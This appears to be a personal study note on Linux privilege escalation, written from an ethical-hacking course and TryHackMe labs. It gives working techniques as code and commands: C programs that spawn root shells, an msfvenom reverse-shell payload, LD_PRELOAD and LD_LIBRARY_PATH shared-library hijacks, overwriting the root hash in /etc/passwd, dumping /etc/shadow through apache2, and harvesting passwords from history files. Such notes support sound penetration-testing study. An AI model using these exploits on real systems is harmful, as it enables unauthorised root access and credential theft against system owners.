
2024-06-13 15:33

Source: #privesc 

Tags: [[linux]]

All Privilege Escalation are effectively examples of access control violations.
#### Permissions in Linux
##### User 
- Users are identified by an integer user ID (UID). The “root” user account is a special type of account in Linux. It has an UID of 0, and the system grants this user access to every file
##### Group
- By default, a user’s primary group has the same name as their user account
##### File & Directory  
- All files & directories have a single owner and a group.
##### Special Permissions
- **setuid (SUID)** bit When set, files will get executed with the privileges of the file owner.
- **setgid (SGID)** bit When set on a file, the file will get executed with the privileges of the file group. 
- When set on a directory, files created within that directory will inherit the group of the directory itself
##### Viewing Permission
```
$ ls -l /bin/date
-rwxr-xr-x 1 root root 60416 Apr 28 2010 /bin/date
```
- above the file is owned by root and belongs to the root group 
- The first 10 characters indicate the permissions set on the file or directory.
- The first character simply indicates the type (e.g. '-' for file, 'd' for directory)
- The remaining 9 characters represent the 3 sets of permissions (owner, group, others).
- Each set contains 3 characters, indicating the read (r), write (w), and execute (x) permissions. 
- SUID/SGID permissions are represented by an 's' in the execute position
##### User ID's 
- each user has 3 user IDs in Linux (real, effective, and saved)
	- Real ID is who they actually are (the ID defined in /etc/passwd).
	- Effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user’s real ID. The effective ID is used in most access control decisions to verify a user, and commands such as `whoami` use the effective ID
	- Saved ID is used to ensure that SUID processes can temporarily switch a user’s effective ID back to their real ID and back again without losing track of the original effective ID
- `id` command will print real and effective uid/gid
- the command below will show the real, effective, saved, and file system user / group IDs of the current process (i.e. our shell)
```
# cat /proc/$$/status | grep "[UG]id"
```








#### Spawning Root shell

use the following methods to spawn a root shell in situations where commands can be executed as root-
##### rootbash SUID

To spawn a root shell, create a copy of the /bin/bash executable file (eg. rename it [[rootbash]]), make sure it is owned by the root user, and has the SUID bit set.
A root shell can be spawned by simply executing the rootbash file with the -p command line option. The benefit of this method is it is persistent (once you run the exploit, rootbash can be used multiple times)

##### Custom Executables

There may be instances where some root process executes another process which you can control. In these cases, the following C code, once compiled, will spawn a Bash shell running as root:  
```
int main() { 
	setuid(0); 
	system("/bin/bash -p"); 
} 

Compile using:
$ gcc -o <name> <filename.c>
```

##### msfvenom

If a reverse shell is preferred, [[msfvenom]] can be used to generate an executable (.elf) file: 
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```
This reverse shell can be caught using netcat or Metasploit’s own multi/handler module.

##### Native Reverse Shells

There are multiple ways to spawn [[revshell]] natively on many Linux distributions. A good tool for suggesting these is: https://github.com/mthbernardes/rsg 

#### Privilege Escalation Tools

##### Linux Smart Enumeration(lse.sh)
[diego-treitos/linux-smart-enumeration: Linux enumeration tool for pentesting and CTFs with verbosity levels (github.com)](https://github.com/diego-treitos/linux-smart-enumeration)
##### LinEnum
Can copy interesting files for export, and search for files containing a keyword (eg. password)
[rebootuser/LinEnum: Scripted Local Linux Enumeration & Privilege Escalation Checks (github.com)](https://github.com/rebootuser/LinEnum)
#### Kernel Exploits

Kernel acts as a layer between application software and the actual computer hardware
Finding and using kernel exploits is usually a simple process:
1. Enumerate kernel version `(uname -a). `
2. Find matching exploits (Google, ExploitDB, GitHub, [linux-exploit-suggester-2](https://github.com/jondonas/linux-exploit-suggester-2))
**while finding exploits make sure to search correct version and flavor of Linux**  
4. Compile and run.
Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash. **Kernel exploits should be the last resort** 

#### Service Exploits 

- See the services that are running as root if vulnerable services are running as root, exploiting them can lead to command execution as root . 
- Service exploits can be found the same way as kernel exploits 
```
$ ps aux | grep "^root"
```
above command will show all processes that are running as root:
##### Enumerating Program Versions
```
$ <program> --version 
$ <program> -v

On Debian-like distributions, dpkg can show installed programs and their version:
$ dpkg -l | grep <program>  

On systems that use rpm, the following achieves the same
$ rpm –qa | grep <program>
```
Example of the above is on [[Services Running as Root]] 
 
##### Port Forwarding

In some instances, a root process may be bound to an internal port, through which it communicates. 
If for some reason, an exploit cannot run locally on the target machine, the port can be forwarded[[Port Forwarding]] using SSH to your local machine: 
```
$ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
```

#### Weak File Permissions
##### Useful commands (can be automated using LinEnum)

Find all writable files in /etc: 
`$ find /etc -maxdepth 1 -writable -type f`

Find all readable files in /etc: 
`$ find /etc -maxdepth 1 -readable -type f`

Find all directories which can be written to:
`$ find / -executable -writable -type d 2> /dev/null`
##### /etc/shadow

- `/etc/shadow` file contains user password hashes
- `/etc/passwd` historically contained user password hashes
- For backwards compatibility, if the second field of a user row in `/etc/passwd `contains a password hash, it takes precedent over the hash in `/etc/shadow`
- If we can write to `/etc/passwd`, we can easily enter a known (generate a hash for a known phrase by using` openssl passwd "pass_phrase"`) password hash (in place of 'x' after the 1st colon in the `/etc/passwd` file) for the root user, and then use the `su` command to switch to the root user. 
- Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different
- the password hash when cat'd out from `/etc/shadow` lies between the 1st and 2nd colon
##### /etc/passwd 

The root account in `/etc/passwd` is usually configured like this:
```
root:x:0:0:root:/root:/bin/bash
```
The “x” in the second field instructs Linux to look for the password hash in the `/etc/shadow` file
- In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password
##### Backups

It is always worth exploring the file system looking for readable backup files. Some common places include user home directories, the / (root) directory, /tmp, and /var/backups


#### Sudo

these will work mostly if you could `sudo` without a password
user must be permitted access via rule(s) in the `/etc/sudoers` file
##### Known Passwords

If your low privileged user account can use [[sudo]] unrestricted (i.e. you can run any programs) and you know the user’s password, privilege escalation is easy, by using the “switch user” (su) command to spawn a root shell. alt methods are listed below, if `sudo su` doesn't work .
```
$ sudo su
$ sudo -s
$ sudo -i 
$ sudo /bin/bash 
$ sudo passwd (to change the root users password)
```
##### Shell Escape Sequence

- Even if we are restricted to running certain programs via sudo, it is sometimes possible to ([[Shell Escape]]) “escape” the program and spawn a shell.
- Since the initial program runs with root privileges, so does the spawned shell. 
- A list of programs with their shell escape sequences can be found here: https://gtfobins.github.io
##### Abusing Intended Functionality

if a program doesn’t have an escape sequence, it may still be possible to use it to escalate privileges
```
$ sudo -l
...
 (root) NOPASSWD: /usr/sbin/apache2
```
- apache2 doesn't have any know shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand
- Run apache2 using `sudo`, and provide it the `/etc/shadow` file as a config file
```
$ sudo apache2 -f /etc/shadow
...
Syntax error on line 1 of /etc/shadow:
Invalid command 'root:....<hash>....'
```
- Extract the root user’s hash from the file.
##### Environment Variables

- Programs run through `sudo` can inherit the environment variables from the user’s environment.
- In the `/etc/sudoers` config file, if the `env_reset` option is set, `sudo` will run programs in a new, minimal environment.
- The `env_keep` option can be used to keep certain environment variables from the user’s environment.
###### LD_PRELOAD

- LD_PRELOAD is an environment variable which can be set to the path of a shared object (.so) file. 
- When set, the shared object will be loaded before any others. 
- By creating a custom shared object and creating an `init()` function, we can execute code as soon as the object is loaded.

 **Limitations**

- LD_PRELOAD will not work if the real user ID is different from the effective user ID. 
- `sudo` must be configured to preserve the LD_PRELOAD environment variable using the `env_keep` option
example. 
- List the programs your user is allowed to run via `sudo -l`:
- Note that the `env_keep` option includes the LD_PRELOAD environment variable.
- Create a file (preload.c) with the following contents:
```
#include <stdio.h> 
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0,0,0); 
	system("/bin/bash -p"); 
}
```
Compile preload.c to preload.so
```
$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```
Run any allowed program( apache2 is used in this eg.) using `sudo`, while setting the LD_PRELOAD environment variable to the full path of the preload.so file:
```
$ sudo LD_PRELOAD=/tmp/preload.so apache2 
```
###### LD_LIBRARY_PATH

This env variable should be preserved in env_keep for further spells to work. 
- The LD_LIBRARY_PATH environment variable contains a set of directories where shared libraries are searched for first.
- The `ldd` command can be used to print the shared libraries used by a program
```
$ ldd /usr/sbin/apache2
```
By creating a shared library with the same name as one used by a program, and setting LD_LIBRARY_PATH to its parent directory, the program will load our shared library instead

- Hijacking shared objects using this method is hit or miss. example. Choose one from the list and try it (libcrypt.so.1 seems to work well)

Create a file (library_path.c) with the following contents:
```
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() { 
	unsetenv("LD_LIBRARY_PATH");
	 setresuid(0,0,0); 
	 system("/bin/bash -p"); 
}
```
Compile library_path.c into libcrypt.so.1: 
```
$ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
```
Run apache2 using `sudo`, while setting the LD_LIBRARY_PATH environment variable to the current path (where we compiled library_path.c)
```
$ sudo LD_LIBRARY_PATH=. apache2
```
#### Cron Jobs

- Cron jobs run with the security level of the user who owns them.
- By default, cron jobs are run using the `/bin/sh` shell, with limited environment variables.
- Cron table files (crontabs) store the configuration for cron jobs
- User crontabs are usually located in` /var/spool/cron/` or `/var/spool/cron/crontabs/`
- The system-wide crontab is located at `/etc/crontab`
Examples of privesc found in [[cron job]]

- The crontab PATH environment variable is by default set to `/usr/bin:/bin`
- The PATH variable can be overwritten in the crontab file
- If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job
##### Wildcard

- When a wildcard character `(*)` is provided to a command as part of an argument, the shell will first perform filename expansion (also known as globbing) on the wildcard
- This process replaces the wildcard with a space-separated list of the file and directory names in the current directory . Further details are in the example file

#### SUID / SGID Executables

If the file is owned by root, it gets executed with root privileges, and we may be able to use it to escalate privileges.




#### Password & keys

##### Passwords

- passwords, such as those for services may be stored in plaintext in config files.
- If the root user re-used their password for a service, that password may be found and used to switch to the root use
##### History Files

- History files record commands issued by users while they are using certain programs. 
- If a user types a password as part of a command, this password may get stored in a history file.
View the contents of hidden files in the user’s home directory with filenames ending in “history”
```
cat ~/.*history | less
```
##### Config Files

- Many services and programs use configuration (config) files to store settings.
- If a service needs to authenticate to something, it might store the credentials in a config file. 
- If these config files are accessible, and the passwords they store are reused by privileged users, we may be able to use it to log in as that user.
##### SSH keys

- SSH keys can be used instead of passwords to authenticate users using SSH.
- If a user has stored their private key insecurely, anyone who can read the key may be able to log into their account using it.

#### NFS

- NFS (Network File System) is a popular distributed file system. 
- [[NFS]] shares are configured in the `/etc/exports` file.
- Remote users can mount shares, access, create, modify files. 
- By default, created files inherit the remote user’s id and group id (as owner and group respectively), even if they don’t exist on the NFS server

**Useful Commands**
```
Show the NFS server’s export list:
showmount -e <target>

Similar Nmap script:
nmap –sV –script=nfs-showmount <target>

Mount an NFS share
mount -o rw,vers=2 <target>:<share> <local_directory>
```


### References

[Linux Privilege Escalation Tutorial: Become an Ethical Hacker | Udemy](https://www.udemy.com/course/linux-privilege-escalation/)

[GitHub - sagishahar/lpeworkshop: Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop?tab=readme-ov-file)

[TryHackMe | Linux PrivEsc](https://tryhackme.com/r/room/linuxprivesc)